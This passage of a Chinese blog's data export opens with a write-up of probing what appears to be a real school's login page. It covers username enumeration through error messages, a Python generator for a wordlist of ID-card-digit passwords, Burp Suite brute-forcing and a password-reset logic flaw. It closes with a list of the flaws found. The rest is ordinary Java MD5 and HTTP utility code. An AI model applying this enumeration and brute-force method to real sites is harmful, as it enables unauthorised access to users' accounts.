alt=\"searchPage\"></p>\n<p>可以看到，在搜索一些国内的网站信息时，百度还是要好用一点。<br></p>\n<p>尝试登录：160003021029/123456<br><br>返回:用户名或密码错误。到这还看不出什么<br><br>再尝试输入: 160000000000/123456<br><br>返回：用户名不存在。(由此可知160003021029用户是存在的，同理，可以知道160003021030等等)<br></p>\n<p>在这一步，由于网站的 <strong>不恰当返回信息处理</strong> (用户名枚举)，我们得到了可用用户名.<br></p>\n<p>接下来该进行爆破了，先生成身份证后六位的密码字典.<br><br>因为从学号可看出是2016届的，所以推测生日应该在1997-1999年，这样字典就只有三万条.<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\"></span><br><span class=\"line\"># ##########################</span><br><span class=\"line\"># 生成身份证后六位的密码字典</span><br><span class=\"line\"># ##########################</span><br><span class=\"line\">year_start = input(&quot;请输入开始年份(四位): &quot;)</span><br><span class=\"line\">year_end = input(&quot;请输入结束年份(四位):&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">if len(year_start) != 4 or len(year_end) != 4:</span><br><span class=\"line\">    print(&quot;输入格式有误&quot;)</span><br><span class=\"line\">    exit(-1)</span><br><span class=\"line\">else:</span><br><span class=\"line\">    year_count = abs(int(year_end) - int(year_start)) + 1</span><br><span class=\"line\">    file_path = os.getcwd() + &quot;/&quot; + year_start + &quot;-&quot; + year_end + &quot;dict.txt&quot;</span><br><span class=\"line\">    f = open(file_path, &quot;a+&quot;)</span><br><span class=\"line\">    for index in range(0, year_count):</span><br><span class=\"line\">        res = []</span><br><span class=\"line\">        if year_start &lt; year_end:</span><br><span class=\"line\">            list_temp = []</span><br><span class=\"line\">            for i in range(0, 10000):</span><br><span class=\"line\">                list_temp.append(str((int(year_start) + index))[-2:] + str(i).zfill(4))</span><br><span class=\"line\">                f.write(str((int(year_start) + index))[-2:] + str(i).zfill(4))</span><br><span class=\"line\">                f.write(&quot;\\n&quot;)</span><br><span class=\"line\">            res.append(list_temp)</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            for i in range(0, 9999):</span><br><span class=\"line\">                list_temp.append(str((int(year_end) + index))[-2:] + str(i).zfill(4))</span><br><span class=\"line\">                f.write(str((int(year_end) + index))[-2:] + str(i).zfill(4))</span><br><span class=\"line\">                f.write(&quot;\\n&quot;)</span><br><span class=\"line\">            res.append(list_temp)</span><br><span class=\"line\">    f.close()</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"3-进行尝试\"><a href=\"#3-进行尝试\" class=\"headerlink\" title=\"3.进行尝试\"></a>3.进行尝试</h4><p>使用burpsuite抓包，然后进行爆破<br><br>没有成功<br><br>换弱密码top100,再次尝试。<br></p>\n<p><img src=\"../../../images/security/example/password_success.png\" alt=\"searchPage\"></p>\n<p>这次可以看到密码：12345不一样，进行手动登录尝试(160003021029/12345).</p>\n<p><img src=\"../../../images/security/example/password_modify.png\" alt=\"searchPage\"></p>\n<p>出现此界面，修改密码。</p>\n<p><img src=\"../../../images/security/example/login_success.png\" alt=\"searchPage\"></p>\n<p>nice,登录成功。<br></p>\n<p>注销登录，换(160003021030/12345)再次尝试<br><br>发现再次出现修改密码界面。<br><br>160003021030/123 再次尝试，并没此问题.<br></p>\n<p>由此惊讶的猜测测，12345并不是真是密码，而是由于逻辑错误造成的漏洞利用<br></p>\n<p>右击登录按钮，检查元素，查看源代码.<br><br><img src=\"../../../images/security/example/code_logic.png\" alt=\"searchPage\"></p>\n<p><img src=\"../../../images/security/example/code_logic_02.png\" alt=\"searchPage\"></p>\n<p>可以看到，因为触发了该界面，可以直接更改密码，且不需要输入密码<br><br>到此，因为没有挂代理，不敢进行下一步操作。</p>\n<h4 id=\"4-事后分析\"><a href=\"#4-事后分析\" class=\"headerlink\" title=\"4.事后分析\"></a>4.事后分析</h4><ul>\n<li>网站登录没有验证码，给了爆破利用空间。<br></li>\n<li>网站登录返回信息处理失误，应统一返回用户或密码出错。<br></li>\n<li>网站逻辑处理有漏洞，如更改密码不需要旧密码。<br></li>\n<li>网站敏感信息能被看到<br></li>\n</ul>\n"},{"title":"hashutil","date":"2019-01-15T08:22:19.000Z","_content":"```\npackage util;\n\nimport java.io.UnsupportedEncodingException;\nimport java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Random;\n\n/**\n * hash(散列),把一些不同长度的输入，转换成相同长度的输出。不可逆，且高度离散性（改变一点点，结果相差很大），导致不可预测.\n * 生成的hash值称为 摘要 ， 摘要 不等于 加密。 加密是通过加密算法将明文转成密文，密文可以通过解密算法还原成明文。\n */\npublic class HashUtil {\n\n    /**\n     * 生成六位随机数\n     * @return\n     */\n    public String creatRandom(){\n        Random random = new Random();\n        String result=\"\";\n        for (int i=0;i<6;i++)\n        {\n            result+=random.nextInt(10);\n        }\n        return result;\n    }\n\n    //通过getInstance()传入MD5,SHA-1,SHA-256,SHA-512等来选择不同算法\n    public static  String getMd5(String str, String... type){\n        MessageDigest messageDigest = null;\n        try {\n            //返回指定算法的MessageDigest对象 抛出NoSuchAlgorithmException\n            //messageDigest = MessageDigest.getInstance(\"SHA-512\");\n            //messageDigest = MessageDigest.getInstance(\"MD5\");\n            messageDigest = (type.length == 0) ? MessageDigest.getInstance(\"MD5\") : MessageDigest.getInstance(type[0]);\n            //重置摘要\n            messageDigest.reset();\n            //使用指定的字节数组或buffer更新摘要,抛出UnsupportEncodingException\n            messageDigest.update(str.getBytes(\"UTF-8\"));\n        }catch (NoSuchAlgorithmException e1){\n            e1.printStackTrace();\n        }catch (UnsupportedEncodingException e2){\n            e2.printStackTrace();\n        }\n        //进行hash计算,byte为8位二进制补码表示的，有符号整数(127到-128)\n        byte[] md5byte = messageDigest.digest();\n\n        StringBuffer md5Str = new StringBuffer();\n        for(int i=0; i<md5byte.length; i++){\n            //int类型为32位，byte为8位（byte转int时高24位为1），用0xFF（高24位全补0）进行与运算，保持其补码不变\n            if(Integer.toHexString(0xFF & md5byte[i]).length() == 1){\n                //位运算后为1位十六进制情况,前面补0\n                md5Str.append(\"0\").append(Integer.toHexString(0xFF & md5byte[i]));\n            }else {\n                //位运算后为2位十六进制情况，直接append\n                md5Str.append(Integer.toHexString(0xFF & md5byte[i]));\n            }\n        }\n        return md5Str.toString();\n    }\n\n    public static  void main(String[] args){\n        System.out.println(getMd5(\"adminbonc123\"));\n    }\n}\n\n```\n","source":"_posts/wheels/java/hashutil.md","raw":"---\ntitle: hashutil\ndate: 2019-01-15 16:22:19\ntags: wheels\n---\n```\npackage util;\n\nimport java.io.UnsupportedEncodingException;\nimport java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Random;\n\n/**\n * hash(散列),把一些不同长度的输入，转换成相同长度的输出。不可逆，且高度离散性（改变一点点，结果相差很大），导致不可预测.\n * 生成的hash值称为 摘要 ， 摘要 不等于 加密。 加密是通过加密算法将明文转成密文，密文可以通过解密算法还原成明文。\n */\npublic class HashUtil {\n\n    /**\n     * 生成六位随机数\n     * @return\n     */\n    public String creatRandom(){\n        Random random = new Random();\n        String result=\"\";\n        for (int i=0;i<6;i++)\n        {\n            result+=random.nextInt(10);\n        }\n        return result;\n    }\n\n    //通过getInstance()传入MD5,SHA-1,SHA-256,SHA-512等来选择不同算法\n    public static  String getMd5(String str, String... type){\n        MessageDigest messageDigest = null;\n        try {\n            //返回指定算法的MessageDigest对象 抛出NoSuchAlgorithmException\n            //messageDigest = MessageDigest.getInstance(\"SHA-512\");\n            //messageDigest = MessageDigest.getInstance(\"MD5\");\n            messageDigest = (type.length == 0) ? MessageDigest.getInstance(\"MD5\") : MessageDigest.getInstance(type[0]);\n            //重置摘要\n            messageDigest.reset();\n            //使用指定的字节数组或buffer更新摘要,抛出UnsupportEncodingException\n            messageDigest.update(str.getBytes(\"UTF-8\"));\n        }catch (NoSuchAlgorithmException e1){\n            e1.printStackTrace();\n        }catch (UnsupportedEncodingException e2){\n            e2.printStackTrace();\n        }\n        //进行hash计算,byte为8位二进制补码表示的，有符号整数(127到-128)\n        byte[] md5byte = messageDigest.digest();\n\n        StringBuffer md5Str = new StringBuffer();\n        for(int i=0; i<md5byte.length; i++){\n            //int类型为32位，byte为8位（byte转int时高24位为1），用0xFF（高24位全补0）进行与运算，保持其补码不变\n            if(Integer.toHexString(0xFF & md5byte[i]).length() == 1){\n                //位运算后为1位十六进制情况,前面补0\n                md5Str.append(\"0\").append(Integer.toHexString(0xFF & md5byte[i]));\n            }else {\n                //位运算后为2位十六进制情况，直接append\n                md5Str.append(Integer.toHexString(0xFF & md5byte[i]));\n            }\n        }\n        return md5Str.toString();\n    }\n\n    public static  void main(String[] args){\n        System.out.println(getMd5(\"adminbonc123\"));\n    }\n}\n\n```\n","slug":"wheels/java/hashutil","published":1,"updated":"2019-01-15T08:23:05.448Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr64053m00276cvpakzc22bv","content":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package util;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.io.UnsupportedEncodingException;</span><br><span class=\"line\">import java.security.MessageDigest;</span><br><span class=\"line\">import java.security.NoSuchAlgorithmException;</span><br><span class=\"line\">import java.util.Random;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * hash(散列),把一些不同长度的输入，转换成相同长度的输出。不可逆，且高度离散性（改变一点点，结果相差很大），导致不可预测.</span><br><span class=\"line\"> * 生成的hash值称为 摘要 ， 摘要 不等于 加密。 加密是通过加密算法将明文转成密文，密文可以通过解密算法还原成明文。</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class HashUtil &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 生成六位随机数</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    public String creatRandom()&#123;</span><br><span class=\"line\">        Random random = new Random();</span><br><span class=\"line\">        String result=&quot;&quot;;</span><br><span class=\"line\">        for (int i=0;i&lt;6;i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            result+=random.nextInt(10);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return result;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    //通过getInstance()传入MD5,SHA-1,SHA-256,SHA-512等来选择不同算法</span><br><span class=\"line\">    public static  String getMd5(String str, String... type)&#123;</span><br><span class=\"line\">        MessageDigest messageDigest = null;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            //返回指定算法的MessageDigest对象 抛出NoSuchAlgorithmException</span><br><span class=\"line\">            //messageDigest = MessageDigest.getInstance(&quot;SHA-512&quot;);</span><br><span class=\"line\">            //messageDigest = MessageDigest.getInstance(&quot;MD5&quot;);</span><br><span class=\"line\">            messageDigest = (type.length == 0) ? MessageDigest.getInstance(&quot;MD5&quot;) : MessageDigest.getInstance(type[0]);</span><br><span class=\"line\">            //重置摘要</span><br><span class=\"line\">            messageDigest.reset();</span><br><span class=\"line\">            //使用指定的字节数组或buffer更新摘要,抛出UnsupportEncodingException</span><br><span class=\"line\">            messageDigest.update(str.getBytes(&quot;UTF-8&quot;));</span><br><span class=\"line\">        &#125;catch (NoSuchAlgorithmException e1)&#123;</span><br><span class=\"line\">            e1.printStackTrace();</span><br><span class=\"line\">        &#125;catch (UnsupportedEncodingException e2)&#123;</span><br><span class=\"line\">            e2.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        //进行hash计算,byte为8位二进制补码表示的，有符号整数(127到-128)</span><br><span class=\"line\">        byte[] md5byte = messageDigest.digest();</span><br><span class=\"line\"></span><br><span class=\"line\">        StringBuffer md5Str = new StringBuffer();</span><br><span class=\"line\">        for(int i=0; i&lt;md5byte.length; i++)&#123;</span><br><span class=\"line\">            //int类型为32位，byte为8位（byte转int时高24位为1），用0xFF（高24位全补0）进行与运算，保持其补码不变</span><br><span class=\"line\">            if(Integer.toHexString(0xFF &amp; md5byte[i]).length() == 1)&#123;</span><br><span class=\"line\">                //位运算后为1位十六进制情况,前面补0</span><br><span class=\"line\">                md5Str.append(&quot;0&quot;).append(Integer.toHexString(0xFF &amp; md5byte[i]));</span><br><span class=\"line\">            &#125;else &#123;</span><br><span class=\"line\">                //位运算后为2位十六进制情况，直接append</span><br><span class=\"line\">                md5Str.append(Integer.toHexString(0xFF &amp; md5byte[i]));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return md5Str.toString();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static  void main(String[] args)&#123;</span><br><span class=\"line\">        System.out.println(getMd5(&quot;adminbonc123&quot;));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package util;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.io.UnsupportedEncodingException;</span><br><span class=\"line\">import java.security.MessageDigest;</span><br><span class=\"line\">import java.security.NoSuchAlgorithmException;</span><br><span class=\"line\">import java.util.Random;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * hash(散列),把一些不同长度的输入，转换成相同长度的输出。不可逆，且高度离散性（改变一点点，结果相差很大），导致不可预测.</span><br><span class=\"line\"> * 生成的hash值称为 摘要 ， 摘要 不等于 加密。 加密是通过加密算法将明文转成密文，密文可以通过解密算法还原成明文。</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class HashUtil &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 生成六位随机数</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    public String creatRandom()&#123;</span><br><span class=\"line\">        Random random = new Random();</span><br><span class=\"line\">        String result=&quot;&quot;;</span><br><span class=\"line\">        for (int i=0;i&lt;6;i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            result+=random.nextInt(10);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return result;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    //通过getInstance()传入MD5,SHA-1,SHA-256,SHA-512等来选择不同算法</span><br><span class=\"line\">    public static  String getMd5(String str, String... type)&#123;</span><br><span class=\"line\">        MessageDigest messageDigest = null;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            //返回指定算法的MessageDigest对象 抛出NoSuchAlgorithmException</span><br><span class=\"line\">            //messageDigest = MessageDigest.getInstance(&quot;SHA-512&quot;);</span><br><span class=\"line\">            //messageDigest = MessageDigest.getInstance(&quot;MD5&quot;);</span><br><span class=\"line\">            messageDigest = (type.length == 0) ? MessageDigest.getInstance(&quot;MD5&quot;) : MessageDigest.getInstance(type[0]);</span><br><span class=\"line\">            //重置摘要</span><br><span class=\"line\">            messageDigest.reset();</span><br><span class=\"line\">            //使用指定的字节数组或buffer更新摘要,抛出UnsupportEncodingException</span><br><span class=\"line\">            messageDigest.update(str.getBytes(&quot;UTF-8&quot;));</span><br><span class=\"line\">        &#125;catch (NoSuchAlgorithmException e1)&#123;</span><br><span class=\"line\">            e1.printStackTrace();</span><br><span class=\"line\">        &#125;catch (UnsupportedEncodingException e2)&#123;</span><br><span class=\"line\">            e2.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        //进行hash计算,byte为8位二进制补码表示的，有符号整数(127到-128)</span><br><span class=\"line\">        byte[] md5byte = messageDigest.digest();</span><br><span class=\"line\"></span><br><span class=\"line\">        StringBuffer md5Str = new StringBuffer();</span><br><span class=\"line\">        for(int i=0; i&lt;md5byte.length; i++)&#123;</span><br><span class=\"line\">            //int类型为32位，byte为8位（byte转int时高24位为1），用0xFF（高24位全补0）进行与运算，保持其补码不变</span><br><span class=\"line\">            if(Integer.toHexString(0xFF &amp; md5byte[i]).length() == 1)&#123;</span><br><span class=\"line\">                //位运算后为1位十六进制情况,前面补0</span><br><span class=\"line\">                md5Str.append(&quot;0&quot;).append(Integer.toHexString(0xFF &amp; md5byte[i]));</span><br><span class=\"line\">            &#125;else &#123;</span><br><span class=\"line\">                //位运算后为2位十六进制情况，直接append</span><br><span class=\"line\">                md5Str.append(Integer.toHexString(0xFF &amp; md5byte[i]));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return md5Str.toString();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static  void main(String[] args)&#123;</span><br><span class=\"line\">        System.out.println(getMd5(&quot;adminbonc123&quot;));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"httpclient","date":"2019-01-15T08:21:54.000Z","_content":"```\npackage util;\n\nimport org.omg.CORBA.portable.OutputStream;\n\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\n/**\n * 发送与接收都是String  接收到String类型的返回后自己用fastJson转一下\n */\npublic class HttpClientUtil {\n    /**\n     * url为地址，params 为请求参数 如 id=1&name=xx\n     * @param url\n     * @param params\n     * @return\n     */\n    private static  Map get(String url, String params){\n        HttpURLConnection connection = null;\n        BufferedReader br = null;\n        Map<String,Object> res = new HashMap<>();\n        StringBuffer sb = new StringBuffer();\n        Map<String,List<String>> headers;\n\n        try{\n            URL send_url = params.equals(\"\") ? new URL(url) : new URL(url + \"?\" + params);\n            connection = (HttpURLConnection) send_url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            //一些设置\n            connection.setRequestProperty(\"Connection\",\"keep-alive\");\n            connection.setRequestProperty(\"Accept-Charset\",\"utf8, gbk; q=0.6\");\n            //content-type浏览器会自动解析\n            //connection.setRequestProperty(\"Content-Type\",\"application/json\");\n            //connection.setDoOutput(true);\n            connection.setUseCaches(false);\n\n            connection.connect();\n            headers = connection.getHeaderFields();\n\n            br = new BufferedReader(new InputStreamReader(connection.getInputStream(),\"UTF-8\"));\n            String line = \"\";\n            while ((line = br.readLine()) != null){\n                sb.append(line);\n            }\n            res.put(\"headers\",headers);\n            res.put(\"response\", sb);\n        }catch (Exception e){\n            System.out.println(\"http_get 异常！\");\n            e.printStackTrace();\n        }finally {\n            try {\n                if(connection != null){\n                    connection.disconnect();\n                }\n                if(br != null){\n                    br.close();\n                }\n            }catch (Exception e2){\n\n            }\n        }\n        return res;\n    }\n\n    /**\n     * params为postc参数\n     * @param url\n     * @param params\n     */\n    private static  Map post(String url, String params){\n        HttpURLConnection connection = null;\n        BufferedReader br = null;\n        OutputStreamWriter out = null;\n        Map<String,Object> res = new HashMap<>();\n        StringBuffer sb = new StringBuffer();\n        Map<String,List<String>> headers;\n\n        try {\n            URL send_url = new URL(url);\n            connection = (HttpURLConnection)send_url.openConnection();\n\n            connection.setRequestMethod(\"POST\");\n            connection.setRequestProperty(\"Content-Type\", \"application/json\");\n            connection.setRequestProperty(\"Connection\", \"Keep-Alive\");\n            connection.setUseCaches(false);\n            //以后就可以使用conn.getOutputStream().write()\n            connection.setDoOutput(true);\n            //以后就可以使用conn.getInputStream().read();\n            connection.setDoInput(true);\n\n            out = new OutputStreamWriter(connection.getOutputStream(),\"UTF-8\");\n            out.write(params);\n            out.flush();\n\n            headers = connection.getHeaderFields();\n            br = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String line;\n            while ((line = br.readLine()) != null){\n                sb.append(line);\n            }\n\n            res.put(\"headers\",headers);\n            res.put(\"response\",sb.toString());\n        }catch (Exception e1){\n            e1.printStackTrace();\n        }finally {\n            try {\n                if(connection != null){\n                    connection.disconnect();\n                }\n                if(br != null){\n                    br.close();\n                }\n                if(out != null){\n                    out.close();\n                }\n            }catch (Exception e2){\n                e2.printStackTrace();\n            }\n        }\n        return res;\n    }\n\n    private void xxxx(){\n\n    }\n\n    public static void main(String args[]){\n//        Map<String,Object> res = get(\"http://127.0.0.1:8080/test1\",\"\");\n//        System.out.println(res.get(\"response\"));\n//        System.out.println(res.get(\"headers\"));\n//        Map<String,List<String>> headers  = (Map<String, List<String>>)res.get(\"headers\");\n//        System.out.println(headers.get(\"Content-Type\"));\n\n        String params = \"{\\n\" +\n                \"    \\\"status\\\": 0,\\n\" +\n                \"    \\\"data\\\": \\\"hello world!\\\"\\n\" +\n                \"}\";\n        Map<String,Object> res = post(\"http://127.0.0.1:8080/test2\",params);\n        System.out.println(res.get(\"response\"));\n\n\n    }\n}\n\n```\n","source":"_posts/wheels/java/httpclient.md","raw":"---\ntitle: httpclient\ndate: 2019-01-15 16:21:54\ntags: wheels\n---\n```\npackage util;\n\nimport org.omg.CORBA.portable.OutputStream;\n\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\n/**\n * 发送与接收都是String  接收到String类型的返回后自己用fastJson转一下\n */\npublic class HttpClientUtil {\n    /**\n     * url为地址，params 为请求参数 如 id=1&name=xx\n     * @param url\n     * @param params\n     * @return\n     */\n    private static  Map get(String url, String params){\n        HttpURLConnection connection = null;\n        BufferedReader br = null;\n        Map<String,Object> res = new HashMap<>();\n        StringBuffer sb = new StringBuffer();\n        Map<String,List<String>> headers;\n\n        try{\n            URL send_url = params.equals(\"\") ? new URL(url) : new URL(url + \"?\" + params);\n            connection = (HttpURLConnection) send_url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            //一些设置\n            connection.setRequestProperty(\"Connection\",\"keep-alive\");\n            connection.setRequestProperty(\"Accept-Charset\",\"utf8, gbk; q=0.6\");\n            //content-type浏览器会自动解析\n            //connection.setRequestProperty(\"Content-Type\",\"application/json\");\n            //connection.setDoOutput(true);\n            connection.setUseCaches(false);\n\n            connection.connect();\n            headers = connection.getHeaderFields();\n\n            br = new BufferedReader(new InputStreamReader(connection.getInputStream(),\"UTF-8\"));\n            String line = \"\";\n            while ((line = br.readLine()) != null){\n                sb.append(line);\n            }\n            res.put(\"headers\",headers);\n            res.put(\"response\", sb);\n        }catch (Exception e){\n            System.out.println(\"http_get 异常！\");\n            e.printStackTrace();\n        }finally {\n            try {\n                if(connection != null){\n                    connection.disconnect();\n                }\n                if(br != null){\n                    br.close();\n                }\n            }catch (Exception e2){\n\n            }\n        }\n        return res;\n    }\n\n    /**\n     * params为postc参数\n     * @param url\n     * @param params\n     */\n    private static  Map post(String url, String params){\n        HttpURLConnection connection = null;\n        BufferedReader br = null;\n        OutputStreamWriter out = null;\n        Map<String,Object> res = new HashMap<>();\n        StringBuffer sb = new StringBuffer();\n        Map<String,List<String>> headers;\n\n        try {\n            URL send_url = new URL(url);\n            connection = (HttpURLConnection)send_url.openConnection();\n\n            connection.setRequestMethod(\"POST\");\n            connection.setRequestProperty(\"Content-Type\", \"application/json\");\n            connection.setRequestProperty(\"Connection\", \"Keep-Alive\");\n            connection.setUseCaches(false);\n            //以后就可以使用conn.getOutputStream().write()\n            connection.setDoOutput(true);\n            //以后就可以使用conn.getInputStream().read();\n            connection.setDoInput(true);\n\n            out = new OutputStreamWriter(connection.getOutputStream(),\"UTF-8\");\n            out.write(params);\n            out.flush();\n\n            headers = connection.getHeaderFields();\n            br = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String line;\n            while ((line = br.readLine()) != null){\n                sb.append(line);\n            }\n\n            res.put(\"headers\",headers);\n            res.put(\"response\",sb.toString());\n        }catch (Exception e1){\n            e1.printStackTrace();\n        }finally {\n            try {\n                if(connection != null){\n                    connection.disconnect();\n                }\n                if(br != null){\n                    br.close();\n                }\n                if(out != null){\n                    out.close();\n                }\n            }catch (Exception e2){\n                e2.printStackTrace();\n            }\n        }\n        return res;\n    }\n\n    private void xxxx(){\n\n    }\n\n    public static void main(String args[]){\n//        Map<String,Object> res = get(\"http://127.0.0.1:8080/test1\",\"\");\n//        System.out.println(res.get(\"response\"));\n//        System.out.println(res.get(\"headers\"));\n//        Map<String,List<String>> headers  = (Map<String, List<String>>)res.get(\"headers\");\n//        System.out.println(headers.get(\"Content-Type\"));\n\n        String params = \"{\\n\" +\n                \"    \\\"status\\\": 0,\\n\" +\n                \"    \\\"data\\\": \\\"hello world!\\\"\\n\" +\n                \"}\";\n        Map<String,Object> res = post(\"http://127.0.0.1:8080/test2\",params);\n        System.out.println(res.get(\"response\"));\n\n\n    }\n}\n\n```\n","slug":"wheels/java/httpclient","published":1,"updated":"2019-01-15T08:23:29.212Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr64053o00296cvpwa7ej3m6","content":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span 